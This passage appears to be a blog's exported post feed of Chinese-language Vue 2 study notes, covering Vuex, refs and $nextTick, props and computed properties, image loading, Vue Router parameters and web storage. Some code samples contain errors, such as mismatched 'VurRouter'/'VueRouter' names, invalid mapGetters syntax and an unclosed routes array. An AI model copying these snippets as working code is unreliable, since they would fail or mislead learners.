<h2 id="actions。再组件中调用actions需要调用this-store-dispatch-‘方法’，value-。组件会调用vuex中actions，请求使用方法，并传递value参数给他。"><a href="#actions。再组件中调用actions需要调用this-store-dispatch-‘方法’，value-。组件会调用vuex中actions，请求使用方法，并传递value参数给他。" class="headerlink" title="actions。再组件中调用actions需要调用this.$store.dispatch(‘方法’，value) 。组件会调用vuex中actions，请求使用方法，并传递value参数给他。"></a>actions。再组件中调用actions需要调用this.$store.dispatch(‘方法’，value) 。组件会调用vuex中actions，请求使用方法，并传递value参数给他。</h2><p>而在actions中的方法中，他将会收到两个参数，context上下文，value参数。这个context上下文可以直接调用state，也可以调用commit方法来继续调用mutation。</p>
<h2 id="mutations，他会接受actions发送过来的请求。然后他也会有两个参数，第一个参数就是state，也就是mutations可以用来修改state中的数据（当然，actions中的context也可以直接调用state并进行修改，但我们并不推荐这么做。）。然后可以直接再mutations中修改state的内容。"><a href="#mutations，他会接受actions发送过来的请求。然后他也会有两个参数，第一个参数就是state，也就是mutations可以用来修改state中的数据（当然，actions中的context也可以直接调用state并进行修改，但我们并不推荐这么做。）。然后可以直接再mutations中修改state的内容。" class="headerlink" title="mutations，他会接受actions发送过来的请求。然后他也会有两个参数，第一个参数就是state，也就是mutations可以用来修改state中的数据（当然，actions中的context也可以直接调用state并进行修改，但我们并不推荐这么做。）。然后可以直接再mutations中修改state的内容。"></a>mutations，他会接受actions发送过来的请求。然后他也会有两个参数，第一个参数就是state，也就是mutations可以用来修改state中的数据（当然，actions中的context也可以直接调用state并进行修改，但我们并不推荐这么做。）。然后可以直接再mutations中修改state的内容。</h2><h2 id="state"><a href="#state" class="headerlink" title="state"></a>state</h2><p>再组件中调用state的内容时，需要使用this.$store.state.内容 来调用state的中的数据。</p>
<h3 id="补充，组件可以直接用commit方法调用mutations。跳过actions。但是我们并不建议这么做，因为会把太多的业务逻辑耦合在一起。"><a href="#补充，组件可以直接用commit方法调用mutations。跳过actions。但是我们并不建议这么做，因为会把太多的业务逻辑耦合在一起。" class="headerlink" title="补充，组件可以直接用commit方法调用mutations。跳过actions。但是我们并不建议这么做，因为会把太多的业务逻辑耦合在一起。"></a>补充，组件可以直接用commit方法调用mutations。跳过actions。但是我们并不建议这么做，因为会把太多的业务逻辑耦合在一起。</h3>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue获取DOM节点和事件处理</title>
    <url>/posts/1ef7b836/</url>
    <content><![CDATA[<h2 id="获取dom节点。"><a href="#获取dom节点。" class="headerlink" title="获取dom节点。"></a>获取dom节点。</h2><p>获取input的dom节点，然后让他被focus。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this.$refs.input.focus()</span><br></pre></td></tr></table></figure>
<p>然而，vue并不会改一次数据就重新渲染模板，可以设置定时器后再修改，这样就会渲染完模板。</p>
<h2 id="nextTick函数"><a href="#nextTick函数" class="headerlink" title="$nextTick函数"></a>$nextTick函数</h2><p>他会在模板解析完后再执行新的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">this.$nextTick(function()&#123;</span><br><span class="line">  this.$refs.input.focus()</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="blur事件。"><a href="#blur事件。" class="headerlink" title="@blur事件。"></a>@blur事件。</h2><p>当输入框失去焦点时调用。</p>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex映射方法的使用</title>
    <url>/posts/c3ea1584/</url>
    <content><![CDATA[<h1 id="vuex的最终使用方法"><a href="#vuex的最终使用方法" class="headerlink" title="vuex的最终使用方法"></a>vuex的最终使用方法</h1><p>再<script>标签中添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &#123;mapGetters,mapState,mapActions&#125; from &#x27;vuex&#x27;</span><br></pre></td></tr></table></figure>
<p>然后有两种使用方法，下面示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">computed:&#123;</span><br><span class="line">  ...mapGetters&#123;sum:&#x27;sum&#x27;,add:&#x27;add&#x27;&#125;//对象式</span><br><span class="line">//对象式的含义：key：表示会在computed中生成的方法函数。而value:表示从mapGetters中调用的方法</span><br><span class="line">  ...mapGetters&#123;[&#x27;sum&#x27;,&#x27;add&#x27;]&#125;//数组式</span><br><span class="line">//数组式的含义即，同时创建再这边的函数并调用mapGetters的方法，这两个方法同名而已。</span><br><span class="line">同理mapMutation也是一样的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue数据通信：props和computed属性</title>
    <url>/posts/84b7f3c5/</url>
    <content><![CDATA[<h2 id="props用法"><a href="#props用法" class="headerlink" title="props用法"></a>props用法</h2><ol>
<li>父组件&#x3D;&#x3D;&gt;子组件 通信</li>
<li>子组件&#x3D;&#x3D;&gt;父组件 必须父组件给子组件一个方法</li>
</ol>
<ul>
<li>props的参数是不能修改的。</li>
</ul>
<h2 id="computed计算属性"><a href="#computed计算属性" class="headerlink" title="computed计算属性"></a>computed计算属性</h2><p>正常写法(例）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">  <span class="attr">isAll</span>:&#123;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="literal">null</span>&#125;,</span><br><span class="line">    <span class="title function_">set</span>(<span class="params"></span>)&#123; ...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简写方式(只有get方法)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">  <span class="title function_">isAll</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="literal">null</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue检测修改：直接修改和指定数组方法</title>
    <url>/posts/9edb4736/</url>
    <content><![CDATA[<p>vue可以检测到的修改：直接对基础变量的修改，直接修改某个对象中的属性，但是如果修改数组的话，必须使用vue指定的方法进行修改，否则vue将无法检测到修改。甚至可以跳过props的检测。</p>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>杂言</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue课设知识点概览</title>
    <url>/posts/50272986/</url>
    <content><![CDATA[<p>5.30号，记录一下本次课设学到的一些知识点：</p>
<ol>
<li>vue无法检测到对象内部数据的变化，即便使用了deep：true标签，也只能检测到对象中第一层属性对应的值的变化，而对于对象内的对象，他就无法检测到他的变化了，只能通过this.$set(1,2,3)来改变对象的属性对应的值。数组则通过数组的四个方法来进行修改，不通过直接获取其index来改变。这样子才能被检测到改变。</li>
<li>如何使用iconpark（字节跳动的矢量图标库）<br>首先现在vue中导入他的组件<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vue2</span></span><br><span class="line">npm i @icon-park/vue</span><br><span class="line"><span class="comment">//vue3</span></span><br><span class="line">npm i @icon-park/vue-next</span><br></pre></td></tr></table></figure>
通过上述导入整个组件后，再在每个使用的地方专门做引用。<br>使用方法：在具体的组件内，导入你所需要的图标。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 引入时使用驼峰式命名</span></span><br><span class="line"><span class="comment"> * import &#123;Alarm&#125; from &#x27;<span class="doctag">@icon</span>-park/vue&#x27;;</span></span><br><span class="line"><span class="comment"> * components: &#123;   Alarm   &#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 使用时使用小写</span></span><br><span class="line"><span class="comment"> *&lt;alarm theme=&quot;outline&quot; size=&quot;24&quot; fill=&quot;#f60&quot; /&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Alarm</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;@icon-park/vue&#x27;</span>;</span><br></pre></td></tr></table></figure>
<img src="https://upload-images.jianshu.io/upload_images/22349103-7600cf878a2f2e6e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="image"></li>
<li>在vue中获取获取图片有两种方式。</li>
</ol>
<ul>
<li>在 JavaScript 被导入或在 template&#x2F;CSS 中通过相对路径被引用。这类引用会被 webpack 处理。</li>
<li>放置在 public 目录下或通过绝对路径被引用。这类资源将会直接被拷贝，而不会经过 webpack 的处理。<br>而经过webpack处理后的图片将会被隐匿，也就是他在项目中的位置会被添加字符串隐藏掉。因此多采用require的方式去引入图片。<br>例如：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img :src=<span class="string">&quot;logo&quot;</span> /&gt;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">     <span class="comment">//相对路径不一定都是./，也可能是../，按照图片存放位置来决定</span></span><br><span class="line">      <span class="attr">logo</span>: <span class="built_in">require</span>(<span class="string">&quot;./imgs/logo.png&quot;</span>) </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这中是通过require的方式引入。而这中引入都是静态的，也就是他的路径已经写死，引入后他的编码方式也会被webpack修改。所以无法通过改变路径或者文件名来引入新的，动态的图片。<br>因此，在这里介绍两种方法，可以动态的引入图片，甚至包括更多的文件：</li>
<li>使用require.context()<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// require.context(directory,useSubdirectories,regExp)</span></span><br><span class="line">     <span class="comment">// directory:表示检索的目录</span></span><br><span class="line">     <span class="comment">// useSubdirectories：表示是否检索子文件夹</span></span><br><span class="line">     <span class="comment">// regExp:匹配文件的正则表达式,一般是文件名</span></span><br><span class="line">     <span class="keyword">const</span> requireContext = <span class="built_in">require</span>.<span class="title function_">context</span>(<span class="string">&#x27;../assets/QQpng&#x27;</span>, <span class="literal">false</span>, <span class="regexp">/\.(png|jpe?g|gif|svg)$/</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 获取images文件夹下的所有图片的base64文件文件名</span></span><br><span class="line">      <span class="keyword">const</span> images = requireContext.<span class="title function_">keys</span>().<span class="title function_">map</span>(requireContext);</span><br></pre></td></tr></table></figure>
在上述代码中，他将会访问<code>assets/QQpng</code>下的所有文件，并通过正则表达式来获取其文件内容并保存到requireContext中，然后<code>.map()</code>是ES6的语法，可以获取数组中某个属性对应的值并将其重新组成数组。最后生成的images就是包含了所有base64编码的图片的原文件。</li>
<li>使用public路径来保存内容，<br>在public路径下的文件他不会经由webpack处理，可以直接通过访问路径来获取。因此可以通过简单的修改路径来完成文件的动态存储和使用。而要让vue使用到public文件夹下的内容。一般的操作可以通过public下，index.html种的一种写法来获取<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;chat.svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&lt;%= htmlWebpackPlugin.options.title %&gt;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">strong</span>&gt;</span>We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
其中的<code>&lt;%= BASE_URL %&gt;</code>就代表了public的路径，通过这个标签可以达到引入public路径下文件的效果。还有另一种。就是将public路径放到Vue的原型链上。这般便可以通过Vue示例来获取<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">axios</span> = axios</span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"><span class="comment">//这里将public的路径保存使用</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">publicPath</span> = process.<span class="property">env</span>.<span class="property">BASE_URL</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>),</span><br><span class="line">  <span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$bus</span> = <span class="variable language_">this</span><span class="comment">//安装全局事件总线</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>
然后直接通过<code>Vue.prototype.publicPath</code>搭配上具体的地址就可以直接跳过webpack动态使用图片了</li>
</ul>
<ol start="4">
<li>有些事件只有在全部元素渲染完成后才能执行，所以引入该方法。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$nextTick(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">       <span class="comment">// 可以使用回调函数的写法</span></span><br><span class="line">       <span class="comment">// 这个函数中DOM必定渲染完成</span></span><br><span class="line">       <span class="variable language_">this</span>.<span class="property">$refs</span>[<span class="string">&quot;input-box&quot;</span>].<span class="title function_">focus</span>()</span><br><span class="line">     &#125;)</span><br></pre></td></tr></table></figure></li>
<li>关于光标的一些操作方法，这里只做示例演示，不细讲<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//处理表情包的发送</span></span><br><span class="line">      <span class="title function_">sendEmotion</span>(<span class="params">index</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">chatPartnerName</span>!==<span class="string">&#x27;请选择聊天对象&#x27;</span>)&#123;</span><br><span class="line">          <span class="comment">//额外需要操作，需要获取光标的位置并且添加完图片后光标保持在表情后面。</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">//获取光标选中的内容(如果光标有选中的内容，即删除掉）</span></span><br><span class="line">          <span class="keyword">let</span> content = <span class="title function_">getSelection</span>()</span><br><span class="line">          content.<span class="title function_">deleteFromDocument</span>()</span><br><span class="line">          <span class="comment">//控制光标位置并添加表情</span></span><br><span class="line">          <span class="keyword">let</span> position = <span class="title function_">getSelection</span>().<span class="title function_">getRangeAt</span>(<span class="number">0</span>)</span><br><span class="line">          <span class="comment">//如果没有光标</span></span><br><span class="line">          <span class="keyword">if</span>(position==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            <span class="comment">//强制获取光标</span></span><br><span class="line">            <span class="keyword">var</span> div = <span class="variable language_">this</span>.<span class="property">$refs</span>[<span class="string">&quot;input-box&quot;</span>]</span><br><span class="line">            div.<span class="title function_">focus</span>()</span><br><span class="line">            position = <span class="title function_">getSelection</span>().<span class="title function_">getRangeAt</span>(<span class="number">0</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">          img.<span class="property">style</span>=<span class="string">&quot;width: 35px;&quot;</span></span><br><span class="line">          img.<span class="property">src</span>=<span class="variable language_">this</span>.<span class="property">emotions</span>[index]</span><br><span class="line">          <span class="comment">//在光标后添加表情</span></span><br><span class="line">          position.<span class="title function_">insertNode</span>(img)</span><br><span class="line">          <span class="comment">//将光标重新定位到表情后面</span></span><br><span class="line">          position.<span class="title function_">setStartAfter</span>(img)</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">handleInput</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>iconpark</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue路由基础</title>
    <url>/posts/845c8696/</url>
    <content><![CDATA[<h1 id="VueRouter路由"><a href="#VueRouter路由" class="headerlink" title="VueRouter路由"></a>VueRouter路由</h1><p>vue使用路由<br>先安装vuerouter，同样的，vue2使用vuerouter3,vue3使用vuerouter4。<br>新建一个路由，再src下建一个router文件夹，<br>写一个index.js。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VurRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">//引入组件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&#x27;../component/About&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;../component/Home&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个路由器</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">   <span class="attr">routes</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>:<span class="title class_">Hmoe</span></span><br><span class="line">        &#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>然后再main.js中引入router。<br>import router from ‘.&#x2F;router’</p>
<h2 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h2><p>要在主页面中使用这些路由需要使用两个新标签。<br><router-link>用来切换路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//router-link</span><br><span class="line">//通过to来使用</span><br><span class="line">//而且router-link他渲染完后也是两个a标签。但是他有跳转功能。</span><br><span class="line">//active会当你点亮某个路径时，帮你点亮</span><br><span class="line">&lt;router-link to=&#x27;/about&#x27; active-class=&quot;active&quot;&gt;About&lt;/router-link&gt;</span><br><span class="line">&lt;router-link to=&#x27;/home&#x27; active-class=&quot;active&quot;&gt;Home&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">//router-view</span><br><span class="line">//用来指定组件展示的位置</span><br><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure>
<p>每次跳转到新组件时，原来的组件将会被销毁。<br>路由组件通常放在pages文件夹下，而一般组件会放在components下</p>
<h2 id="缓存路由组件"><a href="#缓存路由组件" class="headerlink" title="缓存路由组件"></a>缓存路由组件</h2><p>因为经常登录时，会输入密码账号，若是因为组件销毁每次都要重新输入会变得很麻烦。<br>所有需要缓存路由组件，而不是让他直接销毁<br>添加keep-alive标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//可以再keep-alive中添加include属性，限定保存哪些组件，避免保存过多的组件。</span><br><span class="line">&lt;keep-alive&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure>
<p>在使用缓存路由组件时，他会有个问题，就是原本的组件会一直保持运作。因此路由有两个新的生命周期钩子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activated()&#123;</span><br><span class="line">&#125;,</span><br><span class="line">deavtivated()&#123;</span><br><span class="line">&#125;.</span><br></pre></td></tr></table></figure>
<p>他的作用是：当组件出现在页面上的时候便会激活，离开时便会失活。与销毁创建无关。因此只要使用这两个组件就可以实现一些计时的方法。</p>
<h2 id="嵌套子路由"><a href="#嵌套子路由" class="headerlink" title="嵌套子路由"></a>嵌套子路由</h2><p>它可以无限嵌套</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VurRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">//引入组件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&#x27;../component/About&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;../component/Home&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个路由器</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">   <span class="attr">routes</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>:<span class="title class_">Home</span>,</span><br><span class="line">          <span class="attr">children</span>:[</span><br><span class="line">              &#123;</span><br><span class="line"><span class="comment">//嵌套子路由不用再加斜杠</span></span><br><span class="line">                  <span class="attr">path</span>:<span class="string">&#x27;news&#x27;</span>,</span><br><span class="line">                  <span class="attr">component</span>:<span class="title class_">News</span>,</span><br><span class="line">              &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                  <span class="attr">path</span>:<span class="string">&#x27;abls&#x27;</span>,</span><br><span class="line">                  <span class="attr">component</span>:<span class="title class_">Abls</span>,</span><br><span class="line">              &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>##query参数<br>有一种比较低级的传参方法，就是通过es6的模板字符串再带上js的变量，实现传参<br>跳转路由并携带参数，to的字符串写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link :to=&#x27;`/home/message/detail?id=$&#123;this.id&#125;`&#x27;&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>
<p>另一种传递方法。<br>to的对象写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123; path:&#x27;/home/message/detail&#x27;,query:&#123;id:m.id,title:m.title&#125;&#125;&quot;&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>
<h2 id="命名路由"><a href="#命名路由" class="headerlink" title="命名路由"></a>命名路由</h2><p>给路由命名<br>再router&#x2F;index.js中给路由添加上参数<code>name</code>。然后再app组件中，可以通过:to&#x3D;”{name:’’}”来进行跳转<br>只是用来简化路由跳转。</p>
<h2 id="params参数"><a href="#params参数" class="headerlink" title="params参数"></a>params参数</h2><p>&#x2F;&#x2F;第一种，还是使用to的字符串写法。<br>使用restful风格的写法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;`&quot;&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>
<p>然后再路由内添加占位符来获取传递过来的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">path:&#x27;/home/message/detail/:id&#x27;</span><br><span class="line">//通过：可以获取传递过来的id</span><br></pre></td></tr></table></figure>
<p>&#x2F;&#x2F;第二种，使用to的对象写法。就与query类似<br>但是params参数不允许使用path路径。需要通过name来跳转。<br>在需要展示的组件里获得传递过来的参数。通过$route获取。$route.query.内容。或则和$route.params.内容。 </p>
<h2 id="接受参数"><a href="#接受参数" class="headerlink" title="接受参数"></a>接受参数</h2><p>要显示的组件需要接受父组件传过来的参数，第一个就是使用$route.query或者$route.params。但是这个太繁琐了，让子组件显得不明白。<br>第二种写法。<br>通过props对象式。他可以用key-value的方法传递参数</p>
<h3 id="（对象式写法）"><a href="#（对象式写法）" class="headerlink" title="（对象式写法）"></a>（对象式写法）</h3><p>在router&#x2F;index.js中，添加一个参数，props：{a:1, b:4}用来获取父组件传递过来的参数，然后再通过props传递给子组件。子组件中用props接受。</p>
<h3 id="（函数式写法）"><a href="#（函数式写法）" class="headerlink" title="（函数式写法）"></a>（函数式写法）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">props($router)&#123;</span><br><span class="line">  return  &#123;a:$router.query.a,b:$router.params.b&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数式有一个很好的写法，就是可以获得$router对象，然后获取其中的query和params参数</p>
<h2 id="另一种写法"><a href="#另一种写法" class="headerlink" title="另一种写法"></a>另一种写法</h2><p>props的第二种写法。props：true。值为布尔值。若布尔值为真，他会直接把该组件收到的所有params参数以props的形式传递給子组件</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB存储和JSON数据处理</title>
    <url>/posts/96f85423/</url>
    <content><![CDATA[<h2 id="WEBStorage"><a href="#WEBStorage" class="headerlink" title="WEBStorage"></a>WEBStorage</h2><h3 id="localstorage"><a href="#localstorage" class="headerlink" title="localstorage"></a>localstorage</h3><p>本地存储<br>他是js自带的原生方法，并不是vue特有的。他会存储在你自己的浏览器中。而且她只能存储字符串的内容。<br>他是window下的一个函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">localstorage.<span class="title function_">getItem</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">//获取本地存储中的值</span></span><br><span class="line">localstorage.<span class="title function_">setItem</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line"><span class="comment">//设置本地存储的值</span></span><br><span class="line">localstorage.<span class="title function_">removeItem</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">//移除某一个值</span></span><br><span class="line">localstorage.<span class="title function_">clear</span>()</span><br><span class="line"><span class="comment">//清空</span></span><br></pre></td></tr></table></figure>
<p>当你要存储一个对象到localstorage中时，需要先转化为JSON的字符串格式。</p>
<h3 id="sessionstorage"><a href="#sessionstorage" class="headerlink" title="sessionstorage"></a>sessionstorage</h3><p>会话存储<br>他的方法与localstorage一致，但是他只会保存在每一次会话中。当关闭浏览器，会话就会结束，所有内容就会删除。</p>
<h4 id="如果存储在localstorage中的键值不存在，会返回一个null"><a href="#如果存储在localstorage中的键值不存在，会返回一个null" class="headerlink" title="如果存储在localstorage中的键值不存在，会返回一个null"></a>如果存储在localstorage中的键值不存在，会返回一个null</h4><h2 id="JSON方法"><a href="#JSON方法" class="headerlink" title="JSON方法"></a>JSON方法</h2><p>json格式的字符串转化为json对象。<br><code>JSON.parse()</code><br>json对象转化为json格式的字符串<br><code>JSON.stringify()</code></p>
